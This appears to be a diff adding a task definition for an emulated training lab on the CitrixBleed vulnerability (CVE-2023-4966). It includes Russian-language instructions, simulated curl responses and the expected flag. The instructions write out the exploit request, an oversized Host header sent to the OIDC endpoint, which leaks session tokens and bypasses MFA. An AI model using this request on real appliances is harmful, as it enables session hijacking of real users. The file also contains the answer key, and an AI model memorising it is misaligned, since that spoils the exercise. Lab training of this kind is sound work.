@@ -1,0 +1,42 @@
+{
+  "id": "web-citrix-adc",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{c1tr1xbl33d_s3ss10n_t0k3n_l34k}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: CitrixBleed (CVE-2023-4966)\n\nЦель: `https://citrix.local` — Citrix ADC (NetScaler).\n\n1. Определи продукт по заголовку:\n   curl -s -k -I https://citrix.local/vpn/index.html\n\n2. Уязвимый OIDC-эндпоинт отдаёт лишние байты памяти. Запрос с длинным Host:\n   curl -s -k 'https://citrix.local/oauth/idp/.well-known/openid-configuration' -H 'Host: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'\n\n3. В ответе среди прочего — украденный токен сессии `NSC_AAAC=...`.\n   (Эти токены принадлежат уже вошедшим пользователям — обход MFA.)\n\n4. Найди строку с токеном и сохрани её в found.txt, затем набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция citrix.local)",
+      "cases": [
+        {
+          "match": "openid-configuration",
+          "example": "-s -k 'https://citrix.local/oauth/idp/.well-known/openid-configuration' -H 'Host: aaaa...'",
+          "output": "{\"issuer\":\"https://citrix.local/oauth/idp\",\"authorization_endpoint\":\"https://citrix.local/oauth/idp/auth\"}\n2f4b8a1c9e7d3f0a5b6c8d1e2f3a4b5c\nNSC_AAAC=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsImV4cCI6MTcwMDAwMDAwMH0 nto{c1tr1xbl33d_s3ss10n_t0k3n_l34k}\n"
+        },
+        {
+          "match": "vpn/index\\.html",
+          "example": "-s -k -I https://citrix.local/vpn/index.html",
+          "output": "HTTP/2 200\nserver: NS_GATEWAY\ncontent-type: text/html\nset-cookie: NSC_AAAC=; path=/; secure\n"
+        },
+        {
+          "match": "citrix\\.local/?$|citrix\\.local'?$",
+          "example": "-s -k https://citrix.local/",
+          "output": "<html><head><title>Citrix Gateway</title></head></html>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только citrix.local"
+    }
+  }
+}
